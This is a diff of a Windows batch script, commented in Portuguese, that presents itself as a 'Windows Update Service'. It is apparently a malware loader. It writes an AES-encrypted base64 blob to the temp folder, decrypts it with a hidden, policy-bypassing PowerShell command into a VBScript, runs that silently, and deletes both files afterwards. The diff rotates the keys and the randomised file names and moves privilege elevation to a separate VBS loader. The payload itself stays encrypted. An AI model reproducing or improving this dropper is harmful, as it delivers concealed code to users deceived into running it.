@@ -2,39 +2,35 @@
 setlocal EnableDelayedExpansion
 title Windows Update Service
 
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
-    exit /b
-)
+:: (A elevacao ja foi feita pelo VBS loader antes de chamar este .bat)
 
 echo [*] Inicializando componentes...
 
-set "pfKAfz=%TEMP%\Fjz0R.txt"
-set "sMlXqI=%TEMP%\DTAny.vbs"
+set "nS5G0a=%TEMP%\d9coG.txt"
+set "nC4Pg6=%TEMP%\TSU9X.vbs"
 
 :: Salva os dados criptografados em um arquivo de texto
-echo IWpuJY+tr9w7YrGVYpZwzP4AAqYgX0HHOlUUZ+vnTUalramEnyH72fXRTKDx6+B8LyTdc9xmOeMbrWfhNBX4rIKCwjMeWEdGtsQN+9xlrM7vpsJhp5hQx0QFkrFM7bNsjQlmloD/q984WJR/3HcI0BDsGqynTqnOO7+zxmOabiOVU2qAIcRg+HQwqAdBJdg66qQfhAipVzUTg1X+jxsTG2nJQUMsmwJjXsh4OMDC7vf4KtfHvqZo9sogNa5/cakbxbqPDV6q64EfhrDHJU7oUAHOoL7oCBxOIjGCe45EasPc5ZOqXquAJgv68YOyM22+h++jxoHkINy+oADrEDWblNR9rw1qhqrPuuxDEkqYD/turSfV2OSDIFcvxR2aOa6cOgpKj7LaMIpXGJXz14/6rYjkc+oJPhUQY0VuksU6xZXnH6cH7oGWgmUTMwFvBic1X1WjFMgsX8HC5OokFke5jjahFgd/arpgqz8Ny+kr9/Zh5iFszhXycG7SbFFwybRVAX5GNFV164ZmvhS6unHOs0iB/QhdUXMKOTaFJxquYKSNPI7JMKXyyoXIIwgIuMcRJWdB1Zgk1aWrdg8JyFUNx/YjVDGDDVe6q9+bf7sSZhph3xgC3V/ELkdZ657KfnvMzj36+J9vfZOFSfuoDG571Bp4QbMep7ZKfSTBid0DE15gUG0ng5ZZMF7L0mhBbQBF5H9moLyhoN8C8ag+4fH2lKQ7FDIxtwJAD2UOZC4p/V+prCgVYqrmkoeTHCSapme1Z2qYPbY6kNenXIoN4wFCpNxyuGDwrq8h7qW/WsGuT8zlgPTNoNZg2ShNyI5ttfW57mybqmUcIAsWjimQONGHev89Q7veE2xBiFlThWr+D+FqlyHxsyQSzroQ+/CI5zUG > "%pfKAfz%"
+echo I9ojH12L7JIe00fLvb4B5Y/UjLOejzVkFpTxoen+teSEFYfCggH9RRdxxZqf04D8aRzTkDN1zdr2dxFrBd0ZAYoFAm6dH4hqwUXEuSs+dreshqRlbgrB1PE0fZ909o4N3yGF1WcJyTSHSciSeEyx3ah52ZMHXJnYWDvF4AisX3GlxY9zEsBTB14+dOc4vtuDUCQD46RTPZQGZuPDnAec97z6jknHkCqqzts7rzm1Qh1zWPvxEaNjnBVW7D0FoiFqbACTv5iyHwoqGA6YlfepX0SCSVy5uBYzl45RRIeuTgiZs4HnHwKIuuZkI47AGE9CtsVBL1UMbc1vpUbaPtyBdnRIKYS4ks/qCtlUbBhStMkrnr1YHqRrnzpGItPndrC03jRRq1+/Lm2/BX/ck0rob/z7CotxTvGSQR8nrwq1kx8Cx44Asbes7QOTtfQclWdEMk6Y1Y2SkmupbfddXq8L9Lf/u5qHPYcxUiqnxGPakFbANU5tGxN3rZP7utp2MA+J2U3bB19up66TqZSXoljGAEi5dodle10gt8yFYhT8iRBLNRp4T3UKnaaanM6Kvdk+Yo/V48IX/HrO4KL3UucVdA05xygHMLP5mQFmULX6EcSOCIi9UU68jkf6g46Tml0vN8t/dPPrfTrDa2tReoq0bG+lzFeeMqE6DnBQnnTK52LQLzTK+H9CqzKOAA9ZJY+zwE68Mjci1Ypi84mErT+LmN8pHBPeVc17tOzhnNzQIPQYmcahLecxc42XE4lJRJkM1xI5CYz27N0IgsQwsWBO3hvNGrfuesOAx1Uh/bXbtqmCnXorMj+vy424xYrggKiFOLbvgeZO8r/OXjj07H/+bnCgSYm9fF1x4pRNL4XCHFWhVNOWBOs37xOKeb6zcN+HVi2K/ouIDNvZBg3Y6Y1HbRJJ2XUA0o4QLUr7gGEOTfh2J9+RGDbTB6pCrc21jQ4y27fTBcNjlTQnS2cvLrKCxiRHuYuw6g9Isp8ei/37TgY= > "%nS5G0a%"
 
 :: O PowerShell apenas descriptografa o VBS e salva no disco
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-    "$k=[Convert]::FromBase64String('uNw4A6o1/enqm6D/0l8sVSs2Y2JrwrQaSnpPvOWXh7A=');" ^
-    "$iv=[Convert]::FromBase64String('oi0/Cbastt7NJWM3BKXz8A==');" ^
-    "$d=[Convert]::FromBase64String((Get-Content -Raw -Path '%pfKAfz%'));" ^
+    "$k=[Convert]::FromBase64String('zmH82QlKZy6j3TrcpOTwMEGq7cNiM32pa8TktktYPeQ=');" ^
+    "$iv=[Convert]::FromBase64String('z1YKAUlq8xM2Fnc5irKzrg==');" ^
+    "$d=[Convert]::FromBase64String((Get-Content -Raw -Path '%nS5G0a%'));" ^
     "$aes=[System.Security.Cryptography.Aes]::Create();" ^
     "$aes.Key=$k; $aes.IV=$iv;" ^
     "$dec=$aes.CreateDecryptor();" ^
     "$ms=New-Object System.IO.MemoryStream(,$d);" ^
     "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read);" ^
     "$sr=New-Object System.IO.StreamReader($cs);" ^
-    "[System.IO.File]::WriteAllText('%sMlXqI%', $sr.ReadToEnd());" ^
+    "[System.IO.File]::WriteAllText('%nC4Pg6%', $sr.ReadToEnd());" ^
     "$cs.Close(); $ms.Close()"
 
 :: Roda o VBScript silenciosamente
-cscript //nologo //B "%sMlXqI%"
+cscript //nologo //B "%nC4Pg6%"
 
 :: Limpeza
-ping -n 3 127.0.0.1 >nul
-del /f /q "%pfKAfz%" >nul 2>&1
-del /f /q "%sMlXqI%" >nul 2>&1
-exit
+ping -n 2 127.0.0.1 >nul
+del /f /q "%nS5G0a%" >nul 2>&1
+del /f /q "%nC4Pg6%" >nul 2>&1
+exit /b
